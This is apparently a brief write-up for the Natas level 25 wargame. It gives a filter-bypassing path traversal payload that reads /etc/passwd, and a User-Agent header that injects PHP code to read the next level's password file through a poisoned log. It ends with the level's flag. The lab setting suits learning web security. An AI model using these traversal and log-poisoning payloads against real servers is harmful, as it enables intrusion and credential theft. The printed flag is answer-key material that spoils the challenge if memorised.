# Trick

Pass url as argument to read files from server:

```
/?lang=....//....//....//....//....//etc/passwd
```

Look for some error in php logs:

```
/?lang=....//....//....//....//....//var/www/natas/natas25/logs/natas25_<PHPSESSID>.log
```

Inject php code on header:
```
User-Agent: <?php global $__MSG; $__MSG=file_get_contents('/etc/natas_webpass/natas26'); ?>
```

# Flag

```
8A506rfIAXbKKk68yJeuTuRq4UfcK70k
```